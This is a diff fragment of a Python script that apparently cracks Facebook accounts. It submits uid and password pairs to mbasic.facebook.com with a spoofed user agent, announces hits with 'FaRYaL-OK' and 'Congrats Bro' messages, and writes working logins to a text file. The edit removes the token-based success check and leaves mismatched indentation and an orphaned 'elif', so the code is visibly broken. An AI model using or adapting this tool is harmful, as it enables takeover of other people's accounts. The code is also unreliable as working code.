@@ -1279,14 +1279,11 @@ class Main:
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
 }
-			response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
-
-			
-			        if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ FaRYaL-OK ] %s | %s\033[0;97m         "%(uid, pw))
-				print ("\r \033[0;92m Congrats Bro ")
-				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-FaRYaL-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+		response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
+			print("\r \033[0;92m[ FaRYaL-OK ] %s | %s\033[0;97m         "%(uid, pw))
+			print ("\r \033[0;92m Congrats Bro ")
+			self.ok.append("%s|%s"%(uid, pw))
+			open("2009-FaRYaL-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[38;5;46m[ EMRAN-ok ] %s | %s\033[0;97m         "%(uid, pw))
